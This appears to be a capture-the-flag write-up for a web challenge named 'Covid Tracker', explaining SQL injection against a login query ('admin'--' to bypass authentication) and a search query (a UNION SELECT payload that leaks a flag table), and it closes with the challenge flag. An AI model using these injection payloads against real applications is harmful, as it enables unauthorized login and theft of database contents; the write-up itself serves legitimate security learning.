# Covid Tracker [50 pts]

**Category:** Web

**Solves:** 68

## Description
>I made a Covid Tracker to see track how many Covid cases are around. Im hoping I get **injected** with the vaccine soon.
> 
> [challs1.nusgreyhats.org:5201](http://challs1.nusgreyhats.org:5201/)

**Hint**
* \-

## Solution
Category: SQL Injection

For this challenge, the first page features a typical login screen with username and password fields.

Luckily for this challenge, the server's index.js is provided so we do not have to do any blind SQL injection. The front-end js script is also provided within the html source code

### Part 1
For the first exploit, we are given the SQL query:
> SELECT username FROM users WHERE username='${username}' AND password='${password}'


Our goal is to login as username = `admin`, so we can simply use `admin'--` as our user input with the password being anything.

The `--` symbol will mark the text following it as a comment, so our SQL query is now essentially 

> SELECT username FROM users WHERE username='admin'


### Part 2
For the 2nd SQL exploit, we have to get the flag from `location_db`. There are 2 tables in the database, `locations` and `flag`, and the SQL query for the `location_db` is:
> SELECT name, geo, cases FROM locations WHERE name LIKE '${'%' + search + '%'}'

The output of the rows is then sent to the client. Our goal is to make an additional SQL query and leak the value in `flag` table.

The exploit is as follow: `%' UNION SELECT value, value, value FROM flag --`

This results in the the SQL query:
> SELECT name, geo, cases FROM locations WHERE name LIKE '%%' 
> UNION 
> SELECT value, value, value FROM flag --%'

We use 3 `value` here because we need a same number of columns to perform a union of rows

We can now check our leaked flag in the console

### Flag
`greyhats{w3bApp5_n33d_v@cc1ne?_4521f}`
